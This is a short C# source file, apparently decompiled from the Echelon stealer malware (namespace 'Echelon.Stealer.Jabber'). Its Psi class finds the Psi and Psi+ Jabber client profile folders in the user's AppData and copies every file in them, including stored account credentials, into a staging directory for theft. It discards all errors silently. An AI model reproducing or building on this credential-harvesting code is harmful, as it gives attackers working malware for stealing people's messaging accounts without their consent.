using System;
using System.IO;
using Echelon.Global;

namespace Echelon.Stealer.Jabber
{
	// Token: 0x02000016 RID: 22
	internal class Psi
	{
		// Token: 0x0600003B RID: 59 RVA: 0x000043E0 File Offset: 0x000025E0
		public static void Start(string directorypath)
		{
			try
			{
				if (!Directory.Exists(Psi.dir))
				{
					return;
				}
				foreach (FileInfo fileInfo in new DirectoryInfo(Psi.dir).GetFiles())
				{
					Directory.CreateDirectory(directorypath + "\\Jabber\\Psi+\\profiles\\default\\");
					fileInfo.CopyTo(directorypath + "\\Jabber\\Psi+\\profiles\\default\\" + fileInfo.Name);
				}
				Startjabbers.count++;
			}
			catch
			{
			}
			try
			{
				if (Directory.Exists(Psi.dir2))
				{
					foreach (FileInfo fileInfo2 in new DirectoryInfo(Psi.dir2).GetFiles())
					{
						Directory.CreateDirectory(directorypath + "\\Jabber\\Psi\\profiles\\default\\");
						fileInfo2.CopyTo(directorypath + "\\Jabber\\Psi\\profiles\\default\\" + fileInfo2.Name);
					}
					Startjabbers.count++;
				}
			}
			catch
			{
			}
		}

		// Token: 0x04000032 RID: 50
		public static string dir = Help.AppDate + "\\Psi+\\profiles\\default\\";

		// Token: 0x04000033 RID: 51
		public static string dir2 = Help.AppDate + "\\Psi\\profiles\\default\\";
	}
}
